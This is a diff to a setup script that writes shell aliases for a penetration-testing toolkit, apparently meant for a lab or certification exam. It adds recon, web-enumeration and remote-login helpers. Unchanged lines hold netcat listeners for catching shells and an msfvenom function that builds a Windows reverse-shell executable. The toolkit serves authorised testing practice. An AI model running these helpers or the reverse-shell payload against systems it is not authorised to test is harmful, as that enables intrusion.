@@ -145,12 +145,25 @@ sett(){ export RHOST="$1"; export LHOST="$(ip -4 route get "$1" 2>/dev/null | gr
 seti(){ export LHOST="$(ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"; echo "LHOST=$LHOST"; }
 vars(){ echo "RHOST=${RHOST:-<unset>}  LHOST=${LHOST:-<unset>}"; }
 
-# recon
-alias nmapfast='nmap -Pn -n -T3 -p- --open -oN loot/nmap/allports.txt'   # nmapfast $RHOST  (T3=nmap default, polite; T4 if defences lenient)
-nmapsvc(){ nmap -Pn -n -T3 -sV -sC -p "$1" -oN loot/nmap/services.txt "${2:-$RHOST}"; }  # nmapsvc 21,80 $RHOST
-alias smbnull='smbclient -L //$RHOST -N'
+# recon  (recon() = the big port-agnostic script; nmapfast/nmapsvc = quick manual nmap)
+recon(){ bash "$TOOLKIT/scripts/recon.sh" "${1:-$RHOST}"; }                                # recon [ip]  full thorough recon
+alias nmapfast='nmap -Pn -n -T3 -p- --open -oN loot/nmap/allports.txt'                      # nmapfast $RHOST
+nmapsvc(){ nmap -Pn -n -T3 -sV -sC -p "$1" -oN loot/nmap/services.txt "${2:-$RHOST}"; }     # nmapsvc 21,80 [ip]
 
-# serve files / listeners
+# target services — ALL take the REAL port (services can be on odd ports; recon tells you which)
+smbnull(){ smbclient -L "//$RHOST" -N ${1:+-p "$1"}; }                                      # smbnull [port]  list shares
+smap(){ smbmap -H "$RHOST" ${1:+-P "$1"}; }                                                 # smap [port]     R/W access
+web(){ local p="${1:?usage: web <port> [path]}"; local u="http://$RHOST:$p${2:-}"; echo "[*] $u"; whatweb -a3 "$u"; curl -sSIk --max-time 15 "$u"; gobuster dir -u "$u" -w /usr/share/wordlists/dirb/common.txt -t 10 -x php,txt,html,asp,aspx; }   # web <port>  quick enum (any port)
+gob(){ local p="${1:?usage: gob <port> [wordlist]}"; gobuster dir -u "http://$RHOST:$p" -w "${2:-/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt}" -t 10 -x php,txt,html,asp,aspx; }   # gob <port>  deep dirs
+fuzz(){ ffuf -w "${2:-/usr/share/seclists/Discovery/Web-Content/common.txt}" -u "${1:?usage: fuzz <url-with-FUZZ> [wordlist]}" -ac; }   # fuzz 'http://$RHOST:PORT/pg?FUZZ=x'
+rdp(){ xfreerdp3 /u:"${1:?user}" /p:"${2:?pass}" /v:"$RHOST:${3:-3389}" /cert:ignore +clipboard /dynamic-resolution; }   # rdp <user> <pass> [port]
+winrm(){ evil-winrm -i "$RHOST" -u "${1:?user}" -p "${2:?pass}" ${3:+-P "$3"}; }            # winrm <user> <pass> [port]
+ssql(){ impacket-mssqlclient "${1:?user}":"${2:?pass}"@"$RHOST" -p "${3:-1433}"; }          # ssql <user> <pass> [port]
+
+# evidence — wrap ANY manual command to print it + tee its output to loot/ (for screenshots)
+ev(){ echo "+ $*"; "$@" 2>&1 | tee -a "$TOOLKIT/loot/manual-${RHOST:-target}.log"; }         # ev nmap -sV ...
+
+# serve files / listeners  (fixed infra ports — these are YOURS, not the target's)
 alias serve='python3 -m http.server 8081'          # run inside payloads/
 alias smbserve='impacket-smbserver share "$(pwd)" -smb2support'
 alias l4='rlwrap nc -lvnp 4444'                     # foothold catch
@@ -165,7 +178,8 @@ winrev(){ local p="${1:-4444}"; case "$1" in *.*.*.*) p="${2:-4444}";; esac; cat
 # quick msfvenom exe (does NOT count as the one MSF use)
 venexe(){ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT="${1:-4444}" -f exe -o "payloads/rev${1:-4444}.exe" && echo "-> payloads/rev${1:-4444}.exe"; }
 
-echo "aliases loaded. Try:  sett <target> ; vars   (seti <iface> overrides LHOST)"
+echo "aliases loaded. Flow:  sett <target> ; recon ; <enumerate> ; l4 ; winrev 4444 ; whoami /priv"
+echo "  (seti <iface> overrides LHOST · service helpers take the real port: web/gob/smbnull/rdp/winrm/ssql · ev <cmd> saves evidence)"
 ALIASES
 c_g "    aliases.sh written."
 
